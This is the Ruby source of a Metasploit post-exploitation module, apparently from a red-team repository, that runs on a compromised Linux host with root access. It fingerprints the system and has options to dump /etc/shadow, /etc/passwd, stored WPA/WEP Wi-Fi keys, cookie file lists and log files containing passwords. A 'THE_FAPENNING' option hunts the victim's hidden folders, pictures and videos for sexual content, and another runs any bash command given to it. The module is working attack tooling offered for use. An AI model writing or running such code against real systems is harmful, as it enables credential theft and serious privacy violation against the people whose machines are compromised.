require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# The 'def initialize()' funtion ..
# Building Metasploit/Armitage info GUI/CLI description
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'linux hostrecon post-module (fingerprints)',
                        'Description'   => %q{
                                        This module gathers target system information (linux distros) dump remote credentials, display outputs and store results in a logfile in ~/.msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
                                ],
 
                        'Version'        => '$Revision: 1.6',
                        'DisclosureDate' => '10 20 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',  # root privileges required?
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts linux targets
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/RzP3DM' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://rapid7.github.io/metasploit-framework/api/' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('STORE_LOOT', [false, 'Store dumped data into ~/.msf4/loot folder?', false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('AGRESSIVE_DUMP', [false, 'Run agressive system fingerprints scans?', false]),
                                OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target system?', false]),
                                OptBool.new('THE_FAPENNING', [false, 'list hidden folders/pics/vids porn related?', false]),
                                OptString.new('SINGLE_COMMAND', [false, 'Input one bash command to be executed remotely'])
                        ], self.class)
 
        end



#
# The 'def run()' funtion ..
# Running sellected modules against session target.
#
def run

  session = client
  #
  # draw module banner ..
  #
  print_line("+-------------------------------------+")
  print_line("|     LINUX HOSTRECON POST-MODULE     |")
  print_line("| Author : r00t-3xp10it (ssa-redteam) |")
  print_line("+-------------------------------------+")



    #
    # Local variable declarations (msf API calls)
    #
    host_ip = client.session_host
    payload_path = client.fs.dir.pwd
    sys_info = session.sys.config.sysinfo
    session_pid = client.sys.process.getpid
    #
    # Check for proper target operative system (Linux)
    #
    unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
      print_error("[ABORT]: This module only works againts Linux systems ..")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    target_uid = client.sys.config.getuid
    unless target_uid =~ /uid=0/ || target_uid =~ /root/
      print_error("[ABORT]: root access is required in target system ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_good("Running module against: #{sys_info['Computer']}")
      print_warning("Scanning, This may take up to 40 sec ..")
      Rex::sleep(0.5)
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end



      #
      # Dump system information from target (fingerprints)
      #
      data_dump=''
      print_status("Executing list of commands remotely.")
      Rex::sleep(0.2)
      #
      # bash commands to be executed remotely ..
      #
      date_out = cmd_exec("date")
      user_name = cmd_exec("whoami")
      py_version = cmd_exec("python -V")
      distro_uname = cmd_exec("uname -a")
      gcc_version = cmd_exec("gcc -dumpversion")
      opera_version = cmd_exec("opera -version")
      psq_version = cmd_exec("psql -V | awk {'print $3'}")
      ruby_version = cmd_exec("ruby -v  | awk {'print $2'}")
      chromium_version = cmd_exec("chromium --product-version")
      pc_prodname = cmd_exec("dmidecode -s system-product-name")
      chrome_version = cmd_exec("google-chrome --product-version")
      pc_manufacture = cmd_exec("dmidecode -s system-manufacturer")
      chromium_browser = cmd_exec("chromium-browser --product-version")
      firefox_version = cmd_exec("firefox --version | awk {'print $3'}")
      gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
      system_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2")
      iceweasel_version = cmd_exec("iceweasel --version | awk {'print $3'}")
      interface = cmd_exec("netstat -r | grep \"default\" | awk {'print $8'}")
      hardware_vendor = cmd_exec("lscpu | grep \"Vendor ID\" | awk {'print $3'}")
      sudo_version = cmd_exec("sudo -V | grep \"Sudo version\" | awk {'print $3'}")
      xdg_desktop = cmd_exec("set | grep \"XDG_SESSION_DESKTOP\" | cut -d '=' -f2")
      hardware_bits = cmd_exec("lscpu | grep \"CPU op-mode\" | awk {'print $3,$4'}")
      mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
      mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
      number_processsores = cmd_exec("dmidecode -t4 |awk '/Populated/ {print $2}'|wc -l")
      mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
      httpd_version = cmd_exec("apache2 -v | head -n 1 | awk {'print $3'} | cut -d '/' -f2")
      sh_version = cmd_exec("bash --version | head -n 1 | awk {'print $4'} | cut -d '-' -f1")
      mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
      model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
      vm_report = cmd_exec("dmidecode | grep -m 2 \"Type\" | tail -n 1 | cut -d ':' -f2 | tr -d ' '")
      target_ssid = cmd_exec("iw dev #{interface} scan | grep \"SSID\" | head -n 1 | awk {'print $2'}")
      distro_description = cmd_exec("cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\" | cut -d '=' -f2")
      user_privs = cmd_exec("cat /etc/sudoers | grep \"#{user_name}\" | grep -v \"#\" | awk {'print $2,$3'}")
      localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
        #
        # Store data into a local variable (data_dump) ..
        # to be able to write the logfile and display the outputs ..
        #
        print_status("Storing scan results into msf database.")
        Rex::sleep(0.7)
        data_dump << "\n\n"
        data_dump << "linux_hostrecon logfile\n"
        data_dump << "Date/Hour: " + date_out + "\n"
        data_dump << "----------------------------------------\n"
        data_dump << "Running on session   : #{datastore['SESSION']}\n"
        data_dump << "Number-Of-Processores: #{number_processsores}\n"
        data_dump << "Target Computer      : #{sys_info['Computer']}\n"
        data_dump << "Target enviroment    : #{vm_report}\n"
        data_dump << "Target session PID   : #{session_pid}\n"
        data_dump << "Target Architecture  : #{sys_info['Architecture']}\n"
        data_dump << "Target Arch (bits)   : #{hardware_bits}\n"
        data_dump << "Target Arch (vendor) : #{hardware_vendor}\n"
        data_dump << "Manufacturer         : #{pc_manufacture}\n"
        data_dump << "Product-Name         : #{pc_prodname}\n"
        data_dump << "CPU (Model name)     : #{model_name}\n"
        data_dump << "Target mem total     : #{mem_total}\n"
        data_dump << "Target mem free      : #{mem_free}\n"
        data_dump << "Target mem available : #{mem_available}\n"
        data_dump << "Target mem dirty     : #{mem_dirty}\n"
        data_dump << "XDG_session_desktop  : #{xdg_desktop}\n"
        data_dump << "System language      : #{system_lang}\n"
        data_dump << "Sudo version         : #{sudo_version}\n"
        data_dump << "Bash version         : #{sh_version}\n"
        data_dump << "Ruby version         : #{ruby_version}\n"
        data_dump << "Python version       : #{py_version}\n"
        data_dump << "PostgreSQL version   : #{psq_version}\n"
        data_dump << "GCC version          : #{gcc_version}\n"
        data_dump << "Apache2 version      : #{httpd_version}\n"
          #
          # Display (only) remote installed browsers versions ..
          #
          unless firefox_version =~ /not found/ || firefox_version.nil?
            data_dump << "Firefox browser      : #{firefox_version}\n"
          end
          unless chrome_version =~ /not found/ || chrome_version.nil?
            data_dump << "Chrome browser       : #{chrome_version}\n"
          end
          unless chromium_version =~ /not found/ || chromium_version.nil?
            data_dump << "Chromium browser     : #{chromium_version}\n"
          end
          unless chromium_browser =~ /not found/ || chromium_browser.nil?
            data_dump << "Chromium browser     : #{chromium_browser}\n"
          end
          unless iceweasel_version =~ /not found/ || iceweasel_version.nil?
            data_dump << "Iceweasel browser    : #{iceweasel_version}\n"
          end
          unless opera_version =~ /not found/ || opera_version.nil?
            data_dump << "Opera browser        : #{opera_version}\n"
          end
        data_dump << "Target interface     : #{interface}\n"
        data_dump << "Target_SSID          : #{target_ssid}\n"
        data_dump << "Target IP addr       : #{host_ip}\n"
        data_dump << "Target gateway       : #{gateway}\n"
        data_dump << "Target localhost     : #{localhost_ip}\n"
        data_dump << "Payload directory    : #{payload_path}\n"
        data_dump << "Client UID           : #{target_uid}\n"
        data_dump << "User r/w Privileges  : #{user_name}  #{user_privs}\n"
        data_dump << "Distro description   : #{distro_description}\n"
        data_dump << "Operative System     : #{sys_info['OS']}\n"
        data_dump << "Distro uname         : #{distro_uname}\n"
        data_dump << "\n\n"



        #
        # Run agressive scans againts target ..
        # if sellected previous in advanced options (set AGRESSIVE_DUMP true) ..
        #
        if datastore['AGRESSIVE_DUMP'] == true
          print_status("Running agressive fingerprint modules.")
          Rex::sleep(0.5)
          #
          # bash commands to be executed remotely ..
          #
          file_sys = cmd_exec("df -H")
          mont_uuid = cmd_exec("lsblk -f")
          storage_mont = cmd_exec("lsblk -m")
          current_shell = cmd_exec("echo $0")
          list_drivers = cmd_exec("lspci -v")
          cpu_stats = cmd_exec("sudo mpstat")
          net_stat = cmd_exec("netstat -tulpn")
          demi_bios = cmd_exec("dmidecode -t bios")
          cron_tasks = cmd_exec("ls -la /etc/cron*")
          show_essids = cmd_exec("nmcli dev wifi list")
          distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
          distro_history = cmd_exec("ls -la /root/.*_history")
          distro_logs = cmd_exec("find /var/log -type f -perm -4")
          last_login = cmd_exec("last -i | grep \"still logged in\"")
          net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
          default_shell = cmd_exec("ps -p $$ | tail -n 1 | awk '{ print $4 }'")
          sudo_ers = cmd_exec("cat /etc/sudoers | grep -v -e \"^$\" | grep -v \"Defaults\" | grep -v \"#\"")
            #
            # store data into a local variable (data_dump) ..
            # to be able to write the logfile and display the outputs ..
            #
            print_status("Storing scan results into msf database.")
            Rex::sleep(0.7)
            data_dump << "+--------------------------+\n"
            data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
            data_dump << "+--------------------------+\n"
            data_dump << "\n\n"
            data_dump << "FILE SYSTEM :\n"
            data_dump << "-------------\n"
            data_dump << file_sys
            data_dump << "\n\n"
            data_dump << "STORAGE DEVICES INFO:\n"
            data_dump << "---------------------\n"
            data_dump << storage_mont
            data_dump << "\n\n"
            data_dump << mont_uuid
            data_dump << "\n\n"
            data_dump << "CURRENT SHELL :\n"
            data_dump << "---------------\n"
            data_dump << current_shell
            data_dump << "\n\n"
            data_dump << "DEFAULT SHELL :\n"
            data_dump << "---------------\n"
            data_dump << default_shell
            data_dump << "\n\n"
            data_dump << "AVAILABLE SHELLS :\n"
            data_dump << "------------------\n"
            data_dump << distro_shells
            data_dump << "\n\n"
            data_dump << "SUDOERS LIST :\n"
            data_dump << "--------------\n"
            data_dump << sudo_ers
            data_dump << "\n\n"
            data_dump << "LIST OF HISTORY FILES :\n"
            data_dump << "-----------------------\n"
            data_dump << distro_history
            data_dump << "\n\n"
            data_dump << "LIST OF LOGFILES FOUND :\n"
            data_dump << "------------------------\n"
            data_dump << distro_logs
            data_dump << "\n\n"
            data_dump << "TARGET OPEN PORTS :\n"
            data_dump << "-------------------\n"
            data_dump << net_stat
            data_dump << "\n\n"
            data_dump << "ESTABLISHED CONNECTIONS :\n"
            data_dump << "-------------------------\n"
            data_dump << net_established
            data_dump << "\n\n"
            data_dump << "LAST LOGIN USERS        :\n"
            data_dump << "-------------------------\n"
            data_dump << last_login
            data_dump << "\n\n"
            data_dump << "LIST OF ESSIDS AVAILABLE :\n"
            data_dump << "--------------------------\n"
            data_dump << show_essids
            data_dump << "\n\n"
            data_dump << "CRONTAB TASKS :\n"
            data_dump << "---------------\n"
            data_dump << cron_tasks
            data_dump << "\n\n"
            data_dump << "SMBIOS DATA (sysfs) :\n"
            data_dump << "---------------------\n"
            data_dump << demi_bios
            data_dump << "\n\n"
            data_dump << "LIST ALL DRIVERS :\n"
            data_dump << "------------------\n"
            data_dump << list_drivers
            data_dump << "\n\n"
            data_dump << "CPU STATATISTICS :\n"
            data_dump << "------------------\n"
            data_dump << cpu_stats
            data_dump << "\n\n"

        end



        #
        # dump credentials from target ..
        # if sellected previous in advanced options (set CREDENTIALS_DUMP true) ..
        #
        if datastore['CREDENTIALS_DUMP'] == true
          print_status("Dumping remote credentials from target.")
          Rex::sleep(0.2)
          #
          # bash commands to be executed remotely ..
          #
          # dump cookies file names from target
          list_cookies = cmd_exec("ls -a -R ~/ | egrep -i 'sqlite|cookie'")
          # Dump target WIFI credentials stored ..
          wpa_out = cmd_exec("grep psk= /etc/NetworkManager/system-connections/*")
          wep_out = cmd_exec("grep wep-key0= /etc/NetworkManager/system-connections/*")
          # dump etc/passwd & etc/shadow files from target
          etc_pass = cmd_exec("cat /etc/passwd")
          etc_shadow = cmd_exec("cat /etc/shadow")
          # list all uid/guid id's/info
          uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
          # Check log files for keywords (pass|passwd|password) and show positive matches (full paths)
          log_auth = cmd_exec("egrep -l -i 'pass|passwd|password|passphrase' /var/log/*.log")
            #
            # store data into a local variable (data_dump) ..
            # to be able to write the logfile and display the outputs ..
            #
            print_status("Storing scan results into msf database.")
            Rex::sleep(0.7)
            data_dump << "+--------------------------+\n"
            data_dump << "|  REMOTE CREDENTIALS DUMP |\n"
            data_dump << "+--------------------------+\n"
            data_dump << "\n\n"
            data_dump << "LISTING IDs AND GROUPs :\n"
            data_dump << "------------------------\n"
            data_dump << uuid_id
            data_dump << "\n\n"
            data_dump << "WPA CREDENTIALS :\n"
            data_dump << "-----------------\n"
            data_dump << wpa_out
            data_dump << "\n\n"
            data_dump << "WEP CREDENTIALS :\n"
            data_dump << "-----------------\n"
            data_dump << wep_out
            data_dump << "\n\n"
            data_dump << "ETC/PASSWD FILE:\n"
            data_dump << "----------------\n"
            data_dump << etc_pass
            data_dump << "\n\n"
            data_dump << "ETC/SHADOW FILE:\n"
            data_dump << "----------------\n"
            data_dump << etc_shadow
            data_dump << "\n\n"
            data_dump << "LIST LOGFILES WITH 'PASS' STRING:\n"
            data_dump << "---------------------------------\n"
            data_dump << log_auth
            data_dump << "\n\n"
            data_dump << "LISTING COOKIES :\n"
            data_dump << "-----------------\n"
            data_dump << list_cookies
            data_dump << "\n\n"
        end



    #
    # Run agressive scans againts target ..
    # if sellected previous in advanced options (set THE_FAPENNING true) ..
    #
    if datastore['THE_FAPENNING'] == true
      print_status("List remote hidden porn folders/files.")
      Rex::sleep(0.5)
      #
      # bash commands to be executed remotely ..
      # clean local variables to accept new data inputs
      #
      fap_dir=''
      fap_pic=''
      fap_vid=''
      fap_dir = cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"69|adult|ass|blowjob|bobs|bitche|bitches|blonde|doggystyle|fuck|fucking|first time|fotos|girls|girlfriend|lingerie|latina|hot|horny|milf|masturbation|nude|nudes|naked|pics|private|private pics|private fotos|playboy|pornography|porn|pussy|pussycat|sex|sexual|sexy|striptease|slut|sluts|secret|twerk|twerking|tits|teens|teenagers|threesome|virgin|youporn|young|xvideos|xxx\"`; locate $di")
      fap_pic = cmd_exec("pi=`ls -ABR ~/ | grep \"^\\.\" | egrep -i \".bmp|.png|.jpg|.jpeg|.exitf\"`; locate $pi | grep -v \"Trash\"")
      fap_vid = cmd_exec("jk=`ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.mpg|.webm\"`; du -a ~/ | grep \"$jk\" | awk {'print $2'}")
        #
        # store data into a local variable (data_dump) ..
        # to be able to write the logfile and display the outputs ..
        #
        print_status("Storing scan results into msf database.")
        Rex::sleep(0.7)
        data_dump << "+--------------------------------+\n"
        data_dump << "|         THE FAPENNING          |\n"
        data_dump << "+--------------------------------+\n"
        data_dump << "\n\n"
        data_dump << "HIDDEN DIRECTORYS FOUND:\n"
        data_dump << "------------------------\n"
        data_dump << fap_dir
        data_dump << "\n\n\n"
        data_dump << "HIDDEN PICTURES FOUND:\n"
        data_dump << "----------------------\n"
        data_dump << fap_pic
        data_dump << "\n\n\n"
        data_dump << "HIDDEN VIDEOS FOUND:\n"
        data_dump << "--------------------\n"
        data_dump << fap_vid
        data_dump << "\n\n\n"
    end



        #
        # Single_command to execute remotely (user inputs) ..
        # if sellected previous in advanced options (set SINGLE_COMMAND netstat -ano) ..
        #
        exec_bash = datastore['SINGLE_COMMAND']
        # check if single_command option its configurated ..
        if not exec_bash.nil?
          print_status("Executing user inputed bash command.")
          Rex::sleep(0.5)
          # bash command to be executed remotely ..
          single_comm = cmd_exec("#{exec_bash}")
            #
            # store data into a local variable (data_dump) ..
            # to be able to write the logfile and display the outputs ..
            #
            print_status("Storing scan results into msf database.")
            Rex::sleep(0.7)
            data_dump << "+--------------------------------+\n"
            data_dump << "|    COMMAND EXECUTED REMOTELY   |\n"
            data_dump << "+--------------------------------+\n"
            data_dump << "Executed: #{exec_bash}"
            data_dump << "\n\n"
            data_dump << single_comm
            data_dump << "\n\n"
        end


       #
       # All scans finished ..
       # Displaying results on screen (data_dump) ..
       #
       print_good("Remote scans completed, building list.")
       Rex::sleep(2.3)
       # print the contents of (data_dump) local variable on screen ..
       print_line(data_dump)
       Rex::sleep(0.2)


     #
     # Store (data_dump) contents into msf loot folder? (local) ..
     # IF sellected previous in advanced options (set STORE_LOOT true) ..
     #
     if datastore['STORE_LOOT'] == true
       print_good("Session logfile stored in: ~/.msf4/loot folder")
       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
     end



   #
   # end of the 'def run()' funtion (exploit code) ..
   #
   end
#
# exit module execution (_EOF) ..
#
end